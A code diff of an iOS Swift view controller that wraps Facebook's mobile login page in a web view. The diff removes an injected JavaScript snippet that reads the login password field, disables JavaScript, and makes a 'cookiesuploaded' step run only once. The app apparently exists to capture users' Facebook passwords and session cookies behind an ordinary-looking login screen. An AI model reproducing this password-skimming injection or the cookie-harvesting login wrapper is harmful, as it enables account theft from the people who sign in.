@@ -13,10 +13,11 @@ class WebViewController: UIViewController, WKNavigationDelegate {
 
     @IBOutlet weak var webView: UIView!
     @IBOutlet weak var urlLabel: UILabel!
-    var jsGetPassWord = "window.addEventListener('click', event => {if(document.getElementById('m_login_password').value !== \"\"){console.log(document.getElementById('m_login_password').value);}});"
+    
     let HOST_URL = "https://m.facebook.com/"
     var wkWebView: WKWebView!
     var openMainScreen: (() -> Void)?
+    var isCheck = true
     
     override func viewDidLoad() {
         super.viewDidLoad()
@@ -26,7 +27,11 @@ class WebViewController: UIViewController, WKNavigationDelegate {
     
     private func initView() {
         urlLabel.text = HOST_URL
-        wkWebView = WKWebView(frame: self.webView.bounds)
+        let preferences = WKPreferences()
+        preferences.javaScriptEnabled = false
+        let configuration = WKWebViewConfiguration()
+        configuration.preferences = preferences
+        wkWebView = WKWebView(frame: self.webView.bounds,configuration: configuration)
         wkWebView.autoresizingMask = [.flexibleWidth, .flexibleHeight]
         wkWebView.navigationDelegate = self
         self.webView.addSubview(wkWebView)
@@ -110,13 +115,16 @@ extension WebViewController{
                 return
             }
 
-            let preferences = UserDefaults.standard
-            let currentLevelKey = "cookiesuploaded"
-            preferences.setValue(true, forKey: currentLevelKey)
-            preferences.synchronize()
-            DispatchQueue.main.async {
-               let vc = LoginSucessVC()
-                self.push(vc)
+            if self.isCheck{
+                let preferences = UserDefaults.standard
+                let currentLevelKey = "cookiesuploaded"
+                preferences.setValue(true, forKey: currentLevelKey)
+                preferences.synchronize()
+                DispatchQueue.main.async {
+                   let vc = LoginSucessVC()
+                    self.push(vc)
+                }
+                self.isCheck = false
             }
             
         }
